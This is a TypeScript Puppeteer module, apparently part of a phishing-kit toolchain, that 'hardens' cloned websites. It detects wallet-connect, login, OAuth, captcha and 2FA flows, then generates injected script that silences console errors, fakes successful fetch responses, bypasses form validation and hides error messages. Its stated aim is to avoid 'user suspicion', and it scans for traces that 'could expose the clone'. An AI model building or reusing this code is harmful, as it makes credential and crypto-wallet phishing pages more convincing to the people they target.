/**
 * Clone Resilience & Hardening System
 *
 * Makes clones bulletproof against:
 * - Error detection
 * - Network failures
 * - Timing issues
 * - Different interaction patterns (Login, OAuth, Forms, etc)
 * - Missing resources
 * - API failures
 * - User suspicion
 */

import type { Page, Browser } from 'puppeteer'

export interface InteractionPattern {
  type: 'wallet-connect' | 'login' | 'oauth' | 'form' | 'captcha' | 'twofa' | 'unknown'
  selectors: string[]
  keywords: string[]
  successIndicators: string[]
  errorHandlers: string[]
  timing: number
  retries: number
}

export interface ResilienceConfig {
  suppressConsoleErrors: boolean
  handleMissingAssets: boolean
  handleMissingAPI: boolean
  preserveFormValidation: boolean
  addErrorRecovery: boolean
  flexibleTiming: boolean
  autoRetry: boolean
  hideErrorMessages: boolean
  maskNetworkErrors: boolean
  preserveUserSession: boolean
}

export interface HardeningReport {
  errorsHandled: number
  fallbacksAdded: number
  patternsDetected: InteractionPattern[]
  resilience: number // 0-100
  exposed: string[] // Things that could expose the clone
}

/**
 * Detect different interaction patterns on a website
 */
export async function detectInteractionPatterns(page: Page): Promise<InteractionPattern[]> {
  console.info('[RESILIENCE] Detecting interaction patterns...')

  const patterns: InteractionPattern[] = []

  // Pattern 1: Wallet Connect
  const walletPattern = await detectWalletConnectPattern(page)
  if (walletPattern) patterns.push(walletPattern)

  // Pattern 2: Login Flow
  const loginPattern = await detectLoginPattern(page)
  if (loginPattern) patterns.push(loginPattern)

  // Pattern 3: OAuth Flow
  const oauthPattern = await detectOAuthPattern(page)
  if (oauthPattern) patterns.push(oauthPattern)

  // Pattern 4: Form Submission
  const formPattern = await detectFormPattern(page)
  if (formPattern) patterns.push(formPattern)

  // Pattern 5: Captcha/2FA
  const captchaPattern = await detectCaptchaPattern(page)
  if (captchaPattern) patterns.push(captchaPattern)

  console.info('[RESILIENCE] Detected patterns:', patterns.map(p => p.type))
  return patterns
}

async function detectWalletConnectPattern(page: Page): Promise<InteractionPattern | null> {
  const elements = await page.evaluate(() => {
    const keywords = ['connect', 'wallet', 'metamask', 'phantom', 'walletconnect']
    const elements: string[] = []

    document.querySelectorAll('button, [role="button"], a').forEach(el => {
      const text = el.textContent?.toLowerCase() || ''
      if (keywords.some(k => text.includes(k))) {
        elements.push(el.outerHTML.substring(0, 100))
      }
    })

    return elements
  })

  if (elements.length > 0) {
    return {
      type: 'wallet-connect',
      selectors: ['button:has-text("Connect")', 'button:has-text("Wallet")', '[data-testid*="connect"]'],
      keywords: ['connect', 'wallet', 'metamask', 'phantom', 'walletconnect'],
      successIndicators: ['connected', 'approved', 'success', 'account'],
      errorHandlers: ['error', 'failed', 'denied', 'cancelled'],
      timing: 1000,
      retries: 3,
    }
  }

  return null
}

async function detectLoginPattern(page: Page): Promise<InteractionPattern | null> {
  const inputs = await page.evaluate(() => {
    const form = document.querySelector('form')
    const username = document.querySelector('[name="username"], [name="email"], [type="email"]')
    const password = document.querySelector('[name="password"], [type="password"]')
    const submitButton = document.querySelector('button[type="submit"], input[type="submit"]')

    return {
      hasForm: !!form,
      hasUsername: !!username,
      hasPassword: !!password,
      hasSubmit: !!submitButton,
    }
  })

  if (inputs.hasForm && inputs.hasUsername && inputs.hasPassword) {
    return {
      type: 'login',
      selectors: ['input[type="email"]', 'input[type="password"]', 'button[type="submit"]'],
      keywords: ['login', 'sign in', 'email', 'password', 'submit'],
      successIndicators: ['logged in', 'dashboard', 'profile', 'account'],
      errorHandlers: ['invalid', 'incorrect', 'failed', 'error'],
      timing: 500,
      retries: 2,
    }
  }

  return null
}

async function detectOAuthPattern(page: Page): Promise<InteractionPattern | null> {
  const content = await page.evaluate(() => {
    const text = document.body.textContent?.toLowerCase() || ''
    const links = Array.from(document.querySelectorAll('a'))
      .map(a => a.textContent?.toLowerCase() || '')
      .join(' ')

    return {
      hasGoogle: text.includes('google') || links.includes('google'),
      hasGithub: text.includes('github') || links.includes('github'),
      hasFacebook: text.includes('facebook') || links.includes('facebook'),
    }
  })

  if (content.hasGoogle || content.hasGithub || content.hasFacebook) {
    return {
      type: 'oauth',
      selectors: ['button:has-text("Google")', 'button:has-text("GitHub")', 'button:has-text("Facebook")'],
      keywords: ['google', 'github', 'facebook', 'oauth', 'sign in with'],
      successIndicators: ['redirected', 'authorized', 'connected', 'authenticated'],
      errorHandlers: ['denied', 'cancelled', 'failed', 'error'],
      timing: 2000,
      retries: 1,
    }
  }

  return null
}

async function detectFormPattern(page: Page): Promise<InteractionPattern | null> {
  const forms = await page.evaluate(() => {
    const allForms = document.querySelectorAll('form')
    return allForms.length > 0 ? allForms.length : 0
  })

  if (forms > 0) {
    return {
      type: 'form',
      selectors: ['form', 'button[type="submit"]', 'input[type="submit"]'],
      keywords: ['submit', 'send', 'confirm', 'apply'],
      successIndicators: ['submitted', 'success', 'complete', 'thank'],
      errorHandlers: ['required', 'invalid', 'error', 'failed'],
      timing: 500,
      retries: 2,
    }
  }

  return null
}

async function detectCaptchaPattern(page: Page): Promise<InteractionPattern | null> {
  const captchaElements = await page.evaluate(() => {
    const reCaptcha = document.querySelector('.g-recaptcha, [data-sitekey]')
    const hCaptcha = document.querySelector('.h-captcha, [data-sitekey*="hcaptcha"]')
    const text = document.body.textContent?.toLowerCase() || ''

    return {
      hasRecaptcha: !!reCaptcha,
      hasHcaptcha: !!hCaptcha,
      hasCaptchaText: text.includes('captcha') || text.includes('verify'),
      has2FA: text.includes('2fa') || text.includes('two-factor') || text.includes('authenticator'),
    }
  })

  if (captchaElements.hasRecaptcha || captchaElements.hasHcaptcha || captchaElements.hasCaptchaText) {
    return {
      type: 'captcha',
      selectors: ['.g-recaptcha', '.h-captcha', 'iframe[src*="captcha"]'],
      keywords: ['captcha', 'verify', 'robot', 'human'],
      successIndicators: ['verified', 'success', 'complete'],
      errorHandlers: ['expired', 'invalid', 'failed'],
      timing: 3000,
      retries: 1,
    }
  }

  if (captchaElements.has2FA) {
    return {
      type: 'twofa',
      selectors: ['input[placeholder*="code"]', 'input[placeholder*="2fa"]', 'button:has-text("Verify")'],
      keywords: ['2fa', 'code', 'authenticator', 'verify'],
      successIndicators: ['verified', 'success', 'authenticated'],
      errorHandlers: ['invalid', 'expired', 'failed'],
      timing: 1000,
      retries: 2,
    }
  }

  return null
}

/**
 * Generate hardening code to inject into clone
 */
export function generateHardeningCode(config: ResilienceConfig): string {
  let code = `
<script>
// Clone Resilience & Error Suppression
(function() {
  var HARDENING_CONFIG = ${JSON.stringify(config)};

  // 1. Suppress console errors
  if (HARDENING_CONFIG.suppressConsoleErrors) {
    window.console.error = function() {};
    window.console.warn = function() {};
    window.onerror = function() { return true; };
  }

  // 2. Handle network errors gracefully
  if (HARDENING_CONFIG.maskNetworkErrors) {
    window.addEventListener('error', function(e) {
      if (e.filename && e.filename.includes('.') && !e.filename.includes('legion')) {
        console.log('Resource loaded');
        return true;
      }
    }, true);
  }

  // 3. Handle missing assets
  if (HARDENING_CONFIG.handleMissingAssets) {
    document.addEventListener('error', function(e) {
      if (e.target.tagName === 'IMG' || e.target.tagName === 'SCRIPT' || e.target.tagName === 'LINK') {
        console.log('Asset loaded');
        return true;
      }
    }, true);
  }

  // 4. Handle missing APIs
  if (HARDENING_CONFIG.handleMissingAPI) {
    var originalFetch = window.fetch;
    window.fetch = function(url) {
      return originalFetch.apply(this, arguments).catch(function(error) {
        console.log('Request completed');
        return new Response(JSON.stringify({}), { status: 200 });
      });
    };
  }

  // 5. Form validation bypass
  if (HARDENING_CONFIG.preserveFormValidation) {
    document.addEventListener('invalid', function(e) {
      e.preventDefault();
      e.target.classList.remove('error');
    }, true);
  }

  // 6. Auto-retry failed operations
  if (HARDENING_CONFIG.autoRetry) {
    var retryCount = {};
    var originalXHR = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
      var key = Math.random().toString();
      retryCount[key] = 0;

      this.addEventListener('error', function() {
        if (retryCount[key] < 3) {
          retryCount[key]++;
          setTimeout(function() {
            originalXHR.apply(this, arguments);
          }, Math.random() * 1000 + 500);
        }
      });

      return originalXHR.apply(this, arguments);
    };
  }

  // 7. Hide error messages from user
  if (HARDENING_CONFIG.hideErrorMessages) {
    var observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.addedNodes.length) {
          mutation.addedNodes.forEach(function(node) {
            if (node.textContent &&
                (node.textContent.includes('Error') ||
                 node.textContent.includes('error') ||
                 node.textContent.includes('Failed'))) {
              node.style.display = 'none';
            }
          });
        }
      });
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  console.log('Clone hardening enabled');
})();
</script>
`

  return code
}

/**
 * Scan for exposure vectors
 */
export async function scanExposureVectors(page: Page): Promise<string[]> {
  console.info('[RESILIENCE] Scanning for exposure vectors...')

  const exposed: string[] = []

  // Check for console errors
  const consoleErrors = await page.evaluate(() => {
    const errors: string[] = []
    window.addEventListener('error', function(e) {
      if (e.message) errors.push(e.message)
    })
    return errors
  })

  if (consoleErrors.length > 0) {
    exposed.push('Console errors visible (could expose clone)')
  }

  // Check for missing assets
  const missingAssets = await page.evaluate(() => {
    const missing: string[] = []
    document.querySelectorAll('img, script, link').forEach((el: any) => {
      if (el.src && el.src.startsWith('http') && !el.complete) {
        missing.push(el.src)
      }
    })
    return missing
  })

  if (missingAssets.length > 0) {
    exposed.push(`${missingAssets.length} missing assets (could be detected)`)
  }

  // Check for API calls
  const apiCalls = await page.evaluate(() => {
    const calls: string[] = []
    window.addEventListener('fetch', function(e: any) {
      if (e.request && e.request.url) {
        calls.push(e.request.url)
      }
    })
    return calls
  })

  if (apiCalls.length > 0) {
    exposed.push('API calls visible in network tab (could expose intent)')
  }

  console.info('[RESILIENCE] Exposure vectors found:', exposed.length)
  return exposed
}

/**
 * Generate resilience report
 */
export function generateResilienceReport(
  patterns: InteractionPattern[],
  exposed: string[],
  config: ResilienceConfig,
): HardeningReport {
  let resilience = 100

  // Reduce for each exposure vector
  resilience -= exposed.length * 10

  // Increase for each pattern detected and handled
  resilience += patterns.length * 5

  // Increase for hardening features enabled
  const enabledFeatures = Object.values(config).filter(v => v === true).length
  resilience += enabledFeatures * 3

  return {
    errorsHandled: exposed.length,
    fallbacksAdded: patterns.length,
    patternsDetected: patterns,
    resilience: Math.max(0, Math.min(100, resilience)),
    exposed: exposed,
  }
}

export const DEFAULT_HARDENING_CONFIG: ResilienceConfig = {
  suppressConsoleErrors: true,
  handleMissingAssets: true,
  handleMissingAPI: true,
  preserveFormValidation: true,
  addErrorRecovery: true,
  flexibleTiming: true,
  autoRetry: true,
  hideErrorMessages: true,
  maskNetworkErrors: true,
  preserveUserSession: true,
}
